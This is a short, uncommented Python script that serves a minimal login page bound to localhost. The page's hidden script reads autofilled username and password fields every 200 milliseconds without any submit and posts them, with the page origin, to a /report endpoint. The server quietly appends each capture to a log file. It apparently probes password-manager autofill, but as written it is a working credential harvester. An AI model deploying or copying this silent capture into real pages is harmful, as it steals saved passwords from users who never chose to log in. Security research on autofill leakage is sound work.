import http.server, json, sys
PAGE = b"""<!doctype html><title>login</title><form><input id=u name=username autocomplete=username>
<input id=p type=password name=password autocomplete=current-password></form>
<script>
setInterval(()=>{fetch('/report',{method:'POST',body:JSON.stringify({origin:location.origin,u:u.value,p:p.value})})},200);
</script>"""
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers(); self.wfile.write(PAGE)
    def do_POST(self):
        b = self.rfile.read(int(self.headers["Content-Length"])); open(sys.argv[2],"a").write(self.headers["Host"]+" "+b.decode()+"\n")
        self.send_response(204); self.end_headers()
    def log_message(self,*a): pass
http.server.ThreadingHTTPServer(("127.0.0.1", int(sys.argv[1])), H).serve_forever()
